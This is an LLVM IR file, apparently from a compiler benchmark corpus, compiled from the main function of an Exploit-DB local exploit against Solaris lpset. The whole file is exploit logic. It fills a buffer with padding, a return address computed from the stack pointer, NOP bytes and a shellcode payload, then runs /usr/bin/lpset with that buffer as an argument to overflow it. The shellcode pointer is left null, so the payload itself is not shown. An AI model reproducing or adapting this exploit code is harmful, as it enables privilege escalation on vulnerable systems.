; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19872.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19872.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@shellcode = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [13 x i8] c"addr = 0x%x\0A\00", align 1
@.str.1 = private unnamed_addr constant [15 x i8] c"/usr/bin/lpset\00", align 1
@.str.2 = private unnamed_addr constant [6 x i8] c"lpset\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"-n\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"fns\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"-r\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"digit\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca [210 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i64 410, i64* %6, align 8
  store i32 64, i32* %7, align 4
  store i32 40, i32* %8, align 4
  %14 = load i32, i32* %4, align 4
  %15 = icmp sgt i32 %14, 1
  br i1 %15, label %16, label %22

16:                                               ; preds = %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 1
  %19 = load i8*, i8** %18, align 8
  %20 = call i8* @strtol(i8* %19, i32* null, i32 0)
  %21 = ptrtoint i8* %20 to i64
  store i64 %21, i64* %6, align 8
  br label %22

22:                                               ; preds = %16, %2
  %23 = load i32, i32* %4, align 4
  %24 = icmp sgt i32 %23, 2
  br i1 %24, label %25, label %31

25:                                               ; preds = %22
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 2
  %28 = load i8*, i8** %27, align 8
  %29 = call i8* @strtol(i8* %28, i32* null, i32 0)
  %30 = ptrtoint i8* %29 to i32
  store i32 %30, i32* %8, align 4
  br label %31

31:                                               ; preds = %25, %22
  %32 = load i32, i32* %4, align 4
  %33 = icmp sgt i32 %32, 3
  br i1 %33, label %34, label %40

34:                                               ; preds = %31
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 2
  %37 = load i8*, i8** %36, align 8
  %38 = call i8* @strtol(i8* %37, i32* null, i32 0)
  %39 = ptrtoint i8* %38 to i32
  store i32 %39, i32* %7, align 4
  br label %40

40:                                               ; preds = %34, %31
  store i32 0, i32* %12, align 4
  br label %41

41:                                               ; preds = %49, %40
  %42 = load i32, i32* %12, align 4
  %43 = load i32, i32* %8, align 4
  %44 = icmp slt i32 %42, %43
  br i1 %44, label %45, label %52

45:                                               ; preds = %41
  %46 = load i32, i32* %12, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [210 x i8], [210 x i8]* %10, i64 0, i64 %47
  store i8 65, i8* %48, align 1
  br label %49

49:                                               ; preds = %45
  %50 = load i32, i32* %12, align 4
  %51 = add nsw i32 %50, 1
  store i32 %51, i32* %12, align 4
  br label %41

52:                                               ; preds = %41
  %53 = call i64 (...) @get_esp()
  %54 = load i64, i64* %6, align 8
  %55 = add nsw i64 %53, %54
  store i64 %55, i64* %9, align 8
  %56 = load i64, i64* %9, align 8
  %57 = and i64 %56, 255
  %58 = trunc i64 %57 to i8
  %59 = load i32, i32* %12, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %12, align 4
  %61 = sext i32 %59 to i64
  %62 = getelementptr inbounds [210 x i8], [210 x i8]* %10, i64 0, i64 %61
  store i8 %58, i8* %62, align 1
  %63 = load i64, i64* %9, align 8
  %64 = and i64 %63, 65280
  %65 = ashr i64 %64, 8
  %66 = trunc i64 %65 to i8
  %67 = load i32, i32* %12, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %12, align 4
  %69 = sext i32 %67 to i64
  %70 = getelementptr inbounds [210 x i8], [210 x i8]* %10, i64 0, i64 %69
  store i8 %66, i8* %70, align 1
  %71 = load i64, i64* %9, align 8
  %72 = and i64 %71, 16711680
  %73 = ashr i64 %72, 16
  %74 = trunc i64 %73 to i8
  %75 = load i32, i32* %12, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %12, align 4
  %77 = sext i32 %75 to i64
  %78 = getelementptr inbounds [210 x i8], [210 x i8]* %10, i64 0, i64 %77
  store i8 %74, i8* %78, align 1
  %79 = load i64, i64* %9, align 8
  %80 = and i64 %79, 4278190080
  %81 = ashr i64 %80, 24
  %82 = trunc i64 %81 to i8
  %83 = load i32, i32* %12, align 4
  %84 = add nsw i32 %83, 1
  store i32 %84, i32* %12, align 4
  %85 = sext i32 %83 to i64
  %86 = getelementptr inbounds [210 x i8], [210 x i8]* %10, i64 0, i64 %85
  store i8 %82, i8* %86, align 1
  br label %87

87:                                               ; preds = %95, %52
  %88 = load i32, i32* %12, align 4
  %89 = load i32, i32* %7, align 4
  %90 = icmp slt i32 %88, %89
  br i1 %90, label %91, label %98

91:                                               ; preds = %87
  %92 = load i32, i32* %12, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds [210 x i8], [210 x i8]* %10, i64 0, i64 %93
  store i8 -112, i8* %94, align 1
  br label %95

95:                                               ; preds = %91
  %96 = load i32, i32* %12, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %12, align 4
  br label %87

98:                                               ; preds = %87
  store i32 0, i32* %13, align 4
  br label %99

99:                                               ; preds = %114, %98
  %100 = load i32, i32* %13, align 4
  %101 = sext i32 %100 to i64
  %102 = load i8*, i8** @shellcode, align 8
  %103 = call i64 @strlen(i8* %102)
  %104 = icmp ult i64 %101, %103
  br i1 %104, label %105, label %119

105:                                              ; preds = %99
  %106 = load i8*, i8** @shellcode, align 8
  %107 = load i32, i32* %13, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8, i8* %106, i64 %108
  %110 = load i8, i8* %109, align 1
  %111 = load i32, i32* %12, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds [210 x i8], [210 x i8]* %10, i64 0, i64 %112
  store i8 %110, i8* %113, align 1
  br label %114

114:                                              ; preds = %105
  %115 = load i32, i32* %13, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %13, align 4
  %117 = load i32, i32* %12, align 4
  %118 = add nsw i32 %117, 1
  store i32 %118, i32* %12, align 4
  br label %99

119:                                              ; preds = %99
  %120 = getelementptr inbounds [210 x i8], [210 x i8]* %10, i64 0, i64 0
  %121 = call i64 @strlen(i8* %120)
  %122 = getelementptr inbounds [210 x i8], [210 x i8]* %10, i64 0, i64 %121
  store i8 0, i8* %122, align 1
  %123 = load i64, i64* %9, align 8
  %124 = call i32 @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0), i64 %123)
  %125 = getelementptr inbounds [210 x i8], [210 x i8]* %10, i64 0, i64 0
  %126 = call i32 @execl(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i8* %125, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i32* null)
  %127 = load i32, i32* %3, align 4
  ret i32 %127
}

declare dso_local i8* @strtol(i8*, i32*, i32) #1

declare dso_local i64 @get_esp(...) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i32 @printf(i8*, i64) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i8*, i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
